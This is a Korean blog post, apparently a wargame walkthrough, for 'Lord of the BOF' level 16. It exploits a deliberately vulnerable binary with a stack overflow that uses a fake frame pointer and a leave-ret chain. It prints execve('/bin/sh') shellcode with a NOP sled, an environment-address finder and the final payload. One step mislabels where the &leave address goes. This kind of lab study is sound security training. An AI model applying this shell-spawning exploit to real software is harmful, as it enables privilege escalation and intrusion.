---
layout: post
title: "The Lord of the BOF - Level 16"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level16/1.jpg" | relative_url }}' alt='relative'>  

## 1) assassin/pushing me away 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level16/2.png" | relative_url }}' alt='relative'>  

이전 문제와 비교해보니 달라지는 점은 buffer 배열을 0으로 덮어쓰지 않고, strncpy 함수를 사용해 딱 argv\[1\]에서 48 byte까지만 buffer에 저장합니다.  

그러면 buffer에 &shellcode를 입력하고 SFP에는 buffer의 주소를 넣어주고 RET에는 &leave를 넣어주면 문제를 풀 수 있을 것으로 예상됩니다.  

## 2) shellcode 환경변수에 저장하기  

``` bash 
export EGG=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

``` c
// getenv.c
#include <stdio.h>
#include <stdlib.h>
int main(void) {
	printf("ADDR: %p\n", getenv("EGG"));
	return 0;
}
```

<img data-action="zoom" src='{{ "assets/lob/level16/3.png" | relative_url }}' alt='relative'>  

shellcode를 담고있는 환경변수는 0xbffffe48 주소에 저장되어 있습니다.  

&shellcode에는 0xbffffe48 입력하면 됩니다. 리틀엔디언 형식이니 페이로드에는 "\x48\xfe\xff\xbf"을 입력하면 됩니다.  

## 3) &leave 확인하기  

<img data-action="zoom" src='{{ "assets/lob/level16/4.png" | relative_url }}' alt='relative'>  

&leave는 0x80484df 주소에 저장되어 있습니다.  

SFP에는 0x80484df 입력하면 됩니다. 리틀엔디언 형식으로 페이로드에 "\xdf\x84\x04\x08"을 입력합니다.  

## 4) buffer 배열 주소 확인하기  

zombie_assassin 프로그램을 실행할 권한이 없으니 zombie_assassin.c 소스파일로 test 파일을 하나 만들었습니다.  
test 파일을 디버깅 프로그램인 gdb로 실행시켜 buffer의 시작 주소를 확인하였습니다.  

``` bash
gcc -o test zombie_assassin.c
```

<img data-action="zoom" src='{{ "assets/lob/level16/5.png" | relative_url }}' alt='relative'>  

buffer의 위치는 0xbffffa30 주소부터 시작합니다. 페이로드를 작성할 때는 리틀엔디언 형식에 맞춰 "\x30\xfa\xff\xbf"으로 입력합니다.  

## 5) 페이로드 입력하여 BOF 일으키기  

``` bash
./zombie_assassin `python -c 'print "\x48\xfe\xff\xbf"*10+"\x30\xfa\xff\xbf"+"\xdf\x84\x04\x08"'`
```

<img data-action="zoom" src='{{ "assets/lob/level16/6.png" | relative_url }}' alt='relative'>  